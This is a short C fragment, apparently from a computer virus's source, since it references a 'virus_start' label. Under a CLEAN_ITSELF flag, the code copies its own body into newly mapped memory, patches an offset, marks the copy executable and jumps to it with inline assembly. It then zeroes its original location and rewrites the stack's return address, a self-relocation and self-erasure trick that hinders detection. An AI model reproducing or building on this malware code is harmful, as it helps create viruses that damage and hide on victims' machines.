#ifdef	CLEAN_ITSELF
	/* move itself to the new memory location */
	uint32_t nloc;
	nloc = mmap(NULL, g->size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (nloc > 0xfffff000)
		exit(0);
	memcpy((void*)nloc, g->self, g->size);
/*1*/	*(uint32_t*)(nloc + 8) -= nloc - (uint32_t)g->self;
	mprotect(nloc, g->size, PROT_READ|PROT_EXEC);
	asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r"(nloc):"%eax");
	
/*2*/	bzero(g->self, g->size);	

	*(uint32_t*)(&esp - 1) = (nloc + 6);
#endif
